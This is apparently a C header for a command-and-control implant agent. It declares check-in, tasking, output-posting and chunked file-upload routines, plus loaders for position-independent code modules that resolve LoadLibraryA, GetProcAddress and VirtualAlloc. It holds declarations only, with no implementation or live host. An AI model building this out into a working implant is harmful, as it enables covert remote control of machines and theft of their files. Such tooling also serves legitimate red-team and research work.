#include "HTTP.h"

#define MESSAGE_TYPE_CHECKIN 1
#define MESSAGE_TYPE_TASKING 2
#define MESSAGE_TYPE_POST    3
#define MESSAGE_TYPE_UPLOAD  4

#define FILE_CHUNK_SIZE 1024

typedef struct AgentParams {
	char *payload_uuid;
	char *callback_uuid;
	char *callback_host;
	int callback_port;
	int callback_https;
	char *callback_uri;
} AgentParams;

typedef struct CheckinRequest {
	char *payload_uuid;
	unsigned int pid;
	char *username;
	char *hostname;
	char *domain;
} CheckinRequest;

typedef struct CheckinReply {
	char action;
	char *callback_uuid;
	char *status;
} CheckinReply;

typedef struct TaskInfo {
	char *id;
	char *command;
	char *parameters;
	int timestamp;
} TaskInfo;

typedef struct TaskingRequest {
	char *callback_uuid;
	char tasking_size;
} TaskingRequest;

typedef struct TaskingReply {
	char action;
	char tasking_size;
	TaskInfo *tasks;
} TaskingReply;

typedef struct TaskPostRequest {
	char *callback_uuid;
	char *task_id;
	char *task_output;
	char *task_status;
} TaskPostRequest;

typedef struct TaskPostReply {
	int success;
} TaskPostReply;

typedef struct UploadManager {
	char *callback_uuid;
	char *task_id;
	char *file_uuid;
	unsigned int chunk_size;
	int next_chunk;
	char *current_buffer;
	size_t buflen; // current length of data within buffer
	size_t bufsize; // current capacity of buffer
	BOOL finished;
	BOOL error;
} UploadManager;

typedef struct AgentState {
	HttpHandle *http;
	AgentParams params;
} AgentState;

/*
 *
 * PICOs
 *
*/

typedef void (*CHECKIN_PICO)(CheckinRequest *req);
typedef char *(*GETUID_PICO)();

typedef struct {
    __typeof__(LoadLibraryA)   * LoadLibraryA;
    __typeof__(GetProcAddress) * GetProcAddress;
    __typeof__(VirtualAlloc)   * VirtualAlloc;
    __typeof__(VirtualFree)    * VirtualFree;
} WIN32FUNCS;

typedef struct {
	char        *CheckinPicoCode;
	char        *CheckinPicoData;
	CHECKIN_PICO CheckinPicoEntrypoint;
	char        *GetuidPicoCode;
	char        *GetuidPicoData;
	GETUID_PICO  GetuidPicoEntrypoint;
} AgentCapabilities;

/*
 *
 * Function Signatures
 *
*/

void append_str(char *string, char *append);
char *clone_str(char *orig);
void base64_encode(const char *in, const unsigned long in_len, char *out);
int base64_decode(const char *in, const unsigned long in_len, char *out);

char *generate_checkin_message(CheckinRequest *checkin);
void parse_checkin_reply(HttpResponse *response, CheckinReply *reply);
void free_checkin_request(CheckinRequest *request);
void free_checkin_reply(CheckinReply *reply);
void perform_checkin(AgentState *state, AgentCapabilities *cap, CheckinReply *reply);

char *generate_tasking_message(TaskingRequest *tasking);
void parse_tasking_reply(HttpResponse *response, TaskingReply *reply);
void free_tasking_request(TaskingRequest *request);
void free_tasking_reply(TaskingReply *reply);
void perform_tasking(AgentState *state, TaskingReply *reply);

char *generate_post_message(TaskPostRequest *post);
void free_post_request(TaskPostRequest *request);
BOOL perform_post(AgentState *state, TaskInfo *task, TaskPostReply *reply, char *output, char *status);

UploadManager initialise_upload_manager(char *callback_uuid, char *task_id, char *file_uuid);
void free_upload_manager(UploadManager *upload);
BOOL perform_upload(AgentState *stage, UploadManager *upload);

void pack_char(char *buf, int *offset, char paydata);
void pack_uint(char *buf, int *offset, unsigned int paydata);
void pack_string(char *buf, int *offset, char *paydata);
char unpack_char(char *buf, int *offset);
int unpack_int(char *raw_params, int *offset);
unsigned int unpack_uint(char *buf, int *offset);
char *unpack_str(char *raw_params, int *offset);
void unpack_params(char *raw_params, AgentParams *params);
void free_params(AgentParams *params);

void load_picos(AgentCapabilities *cap);
void free_picos(AgentCapabilities *cap);
